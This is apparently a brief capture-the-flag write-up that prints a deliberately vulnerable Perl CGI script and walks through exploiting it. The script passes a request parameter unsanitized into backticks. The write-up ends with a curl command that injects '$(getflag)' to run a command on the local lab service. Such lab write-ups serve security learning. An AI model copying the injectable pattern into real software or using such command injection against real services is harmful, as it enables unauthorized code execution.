another SUID script

cat level04.pl 
 #!/usr/bin/perl
 # localhost:4747
 use CGI qw{param};
 print "Content-type: text/html\n\n";
 sub x {
   $y = $_[0];
   print `echo $y 2>&1`;
 }
 x(param("x"));

it's a Perl script that listens on the 4747 port
it calls a subroutine "x" with the "x" parameter everytime it receives a request, which assigns the first argument to the y variable and prints the result of `echo $y 2>&1`
backticks (`) in Perl cause their content to be executed, so if y's value was something like "$(getflag)" the script would print the command's output

curl -d x="\$(getflag)" localhost:4747
